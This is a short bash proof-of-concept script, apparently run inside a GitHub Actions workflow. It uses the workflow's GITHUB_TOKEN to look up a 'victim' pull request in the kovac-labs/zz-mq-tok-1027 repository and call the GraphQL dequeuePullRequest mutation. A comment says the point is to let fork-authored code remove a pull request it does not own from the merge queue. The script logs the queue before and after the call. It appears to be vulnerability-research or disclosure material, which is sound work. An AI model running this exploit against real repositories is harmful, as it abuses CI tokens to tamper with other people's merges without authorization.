#!/usr/bin/env bash
set -u
echo "DQ|CTX|event=${GITHUB_EVENT_NAME}|ref=${GITHUB_REF}"
if [ -z "${GITHUB_TOKEN:-}" ]; then echo "DQ|VOID|no token"; echo "DQ|DONE"; exit 0; fi
gql(){ curl -s -H "Authorization: bearer ${GITHUB_TOKEN}" -H 'Content-Type: application/json' \
        -X POST -d "$1" https://api.github.com/graphql; }
VICTIM=$(cat "$GITHUB_WORKSPACE/victim.txt")
echo "DQ|VICTIM-PR|${VICTIM}"
q="{\"query\":\"query{repository(owner:\\\"kovac-labs\\\",name:\\\"zz-mq-tok-1027\\\"){pullRequest(number:${VICTIM}){id number author{login} state}}}\"}"
r=$(gql "$q"); echo "DQ|VICTIM-INFO|$(printf '%s' "$r" | head -c 240)"
pid=$(printf '%s' "$r" | python3 -c 'import sys,json;print((json.load(sys.stdin).get("data") or {}).get("repository",{}).get("pullRequest",{}).get("id",""))' 2>/dev/null)
# queue BEFORE
qq='{"query":"query{repository(owner:\"kovac-labs\",name:\"zz-mq-tok-1027\"){mergeQueue(branch:\"dq2base\"){entries(first:10){nodes{position state pullRequest{number}}}}}}"}'
echo "DQ|QUEUE-BEFORE|$(gql "$qq" | head -c 320)"
# THE CALL: fork-authored code removes a pull request it does not own from the merge queue
m="{\"query\":\"mutation{dequeuePullRequest(input:{id:\\\"${pid}\\\"}){mergeQueueEntry{id state}}}\"}"
echo "DQ|DEQUEUE-RESULT|$(gql "$m" | head -c 320)"
sleep 5
echo "DQ|QUEUE-AFTER|$(gql "$qq" | head -c 320)"
echo "DQ|DONE"
